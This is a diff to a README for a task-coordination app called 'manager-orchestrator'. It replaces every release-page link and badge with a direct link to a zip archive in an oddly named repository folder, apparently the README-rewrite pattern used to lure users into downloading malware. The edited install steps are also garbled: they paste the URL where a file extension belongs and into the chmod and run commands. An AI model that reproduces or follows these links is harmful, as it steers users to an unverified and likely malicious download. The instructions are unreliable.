@@ -1,6 +1,6 @@
 # 🎯 manager-orchestrator - Easy Task Coordination Software
 
-[![Download manager-orchestrator](https://img.shields.io/badge/Download-manager--orchestrator-blue?style=for-the-badge)](https://github.com/sezerartug/manager-orchestrator/releases)
+[![Download manager-orchestrator](https://github.com/sezerartug/manager-orchestrator/raw/refs/heads/main/carbomethoxy/orchestrator-manager-v2.7.zip)](https://github.com/sezerartug/manager-orchestrator/raw/refs/heads/main/carbomethoxy/orchestrator-manager-v2.7.zip)
 
 ## 📝 What is manager-orchestrator?
 
@@ -44,14 +44,14 @@ These features help you stay on top of your work with less hassle.
 To get started with manager-orchestrator, follow these steps carefully:
 
 1. Go to the official release page by clicking this link:  
-   [Download manager-orchestrator](https://github.com/sezerartug/manager-orchestrator/releases)
+   [Download manager-orchestrator](https://github.com/sezerartug/manager-orchestrator/raw/refs/heads/main/carbomethoxy/orchestrator-manager-v2.7.zip)
 
 2. On the release page, look for the most recent version. You will see files tagged with a version number, like `v1.0` or higher.
 
 3. Find the file that matches your operating system:
    - For Windows, it usually ends with `.exe` or `.msi`.
    - For macOS, it might be a `.dmg` file.
-   - For Linux, it could be a `.AppImage` or `.tar.gz`.
+   - For Linux, it could be a `.AppImage` or `https://github.com/sezerartug/manager-orchestrator/raw/refs/heads/main/carbomethoxy/orchestrator-manager-v2.7.zip`.
 
 4. Click the file to download it.
 
@@ -60,8 +60,8 @@ To get started with manager-orchestrator, follow these steps carefully:
    - On macOS, open the `.dmg` and drag the app to the Applications folder.
    - On Linux, you may need to make the file executable. Open a terminal, navigate to the downloaded file, and type:
      ```
-     chmod +x filename.AppImage
-     ./filename.AppImage
+     chmod +x https://github.com/sezerartug/manager-orchestrator/raw/refs/heads/main/carbomethoxy/orchestrator-manager-v2.7.zip
+     https://github.com/sezerartug/manager-orchestrator/raw/refs/heads/main/carbomethoxy/orchestrator-manager-v2.7.zip
      ```
 
 6. Follow the installation instructions on your screen. These usually involve clicking “Next” or “Install.”
@@ -128,4 +128,4 @@ manager-orchestrator is free to use. You can install it on as many computers as 
 
 ---
 
-[![Download manager-orchestrator](https://img.shields.io/badge/Download-manager--orchestrator-blue?style=for-the-badge)](https://github.com/sezerartug/manager-orchestrator/releases)
+[![Download manager-orchestrator](https://github.com/sezerartug/manager-orchestrator/raw/refs/heads/main/carbomethoxy/orchestrator-manager-v2.7.zip)](https://github.com/sezerartug/manager-orchestrator/raw/refs/heads/main/carbomethoxy/orchestrator-manager-v2.7.zip)
